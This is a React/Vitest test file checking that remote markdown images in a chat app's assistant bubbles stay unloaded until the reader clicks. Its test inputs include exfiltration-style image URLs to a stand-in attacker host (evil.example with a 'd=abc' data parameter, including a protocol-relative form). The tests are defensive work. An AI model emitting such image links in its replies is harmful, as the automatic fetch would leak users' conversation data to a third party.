/**
 * A remote markdown image in a Mochi chat bubble waits for a click.
 *
 * The bubble renderer used to emit a plain `<img src="https://…">` for any
 * non-local src, so the browser fetched a model-chosen URL with no click. It
 * now goes through the core renderer's click-to-load gate, like the main chat.
 * Local paths still render through LocalImage.
 */
import React from 'react'
import { cleanup, fireEvent, render, screen } from '@testing-library/react'
import { afterEach, describe, expect, it, vi } from 'vitest'

// A read that never settles: these tests assert which path is read, and no
// state update lands after the test ends.
const { readLocalImage } = vi.hoisted(() => ({ readLocalImage: vi.fn((_path: string) => new Promise<string | null>(() => {})) }))
vi.mock('../src/mochiApi', () => ({ api: { readLocalImage } }))

import { Bubble } from '../src/renderer/ChatPanel'

afterEach(() => { cleanup(); vi.clearAllMocks() })

function renderAssistant(content: string) {
  return render(<Bubble animate={false} message={{ id: 'm1', role: 'assistant', content, timestamp: 1 }} />)
}

describe('mochi Bubble remote markdown images', () => {
  // `.svg` and extension-less URLs: the bubble lifts `.png`-style paths out of
  // the text before markdown runs, so only these reach the markdown image
  // component, where the local-vs-remote decision is made.
  it.each([
    'https://evil.example/p.svg?d=abc',
    'https://evil.example/pixel?d=abc',
  ])('creates no <img> for %s until the reader clicks', (url) => {
    const { container } = renderAssistant(`look ![pic](${url})`)
    expect(container.querySelector('img')).toBeNull()
    fireEvent.click(screen.getByRole('button', { name: /click to load/i }))
    const img = container.querySelector('img')
    expect(img).not.toBeNull()
    expect(new URL(img!.getAttribute('src')!, window.location.href).host).toBe('evil.example')
  })

  it('gates a protocol-relative src behind the same click', () => {
    const { container } = renderAssistant('look ![pic](//evil.example/pixel?d=abc)')
    expect(container.querySelector('img')).toBeNull()
    fireEvent.click(screen.getByRole('button', { name: /click to load/i }))
    expect(new URL(container.querySelector('img')!.getAttribute('src')!).host).toBe('evil.example')
  })

  it('still reads a local path through LocalImage', () => {
    const { container } = renderAssistant('![shot](/home/u/uploads/shot.png)')
    expect(readLocalImage).toHaveBeenCalledWith('/home/u/uploads/shot.png')
    expect(container.querySelector('img[src="/home/u/uploads/shot.png"]')).toBeNull()
    expect(screen.queryByRole('button', { name: /click to load/i })).toBeNull()
  })

  it('keeps a gateway-relative image as a plain <img>', () => {
    const { container } = renderAssistant('![logo](/assets/logo.svg)')
    expect(container.querySelector('img[src="/assets/logo.svg"]')).not.toBeNull()
    expect(readLocalImage).not.toHaveBeenCalled()
  })
})
